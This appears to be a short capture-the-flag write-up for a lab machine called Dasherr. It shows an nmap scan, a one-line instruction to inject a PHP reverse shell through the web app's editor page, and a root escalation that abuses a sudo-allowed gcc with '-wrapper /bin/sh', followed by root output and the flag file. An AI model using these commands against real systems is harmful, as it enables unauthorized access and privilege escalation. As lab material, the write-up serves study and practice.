## Recon

```
└─# nmap -sS -vvv -A --min-rate 5000 10.0.160.146   
PORT     STATE SERVICE REASON         VERSION
8085/tcp open  http    syn-ack ttl 63 nginx 1.18.0
|_http-title: Dasherr
| http-methods: 
|_  Supported Methods: GET HEAD POST
|_http-server-header: nginx/1.18.0
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
```
On port 8085 use burp modify the editor page and inject your ivan seck php, then run it you will get a shell
## Root
```

ETSCTF@dasherr:~$ sudo -l
sudo -l
Matching Defaults entries for ETSCTF on dasherr:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User ETSCTF may run the following commands on dasherr:
    (ALL : ALL) NOPASSWD: /usr/bin/gcc
ETSCTF@dasherr:~$ sudo gcc -wrapper /bin/sh,-s .
sudo gcc -wrapper /bin/sh,-s .
# id
id
uid=0(root) gid=0(root) groups=0(root)
# cd /root
cd /root
# ls
ls
ETSCTF_6e9179c0d4d553e5954e3ee5bfec5fd2
# 

```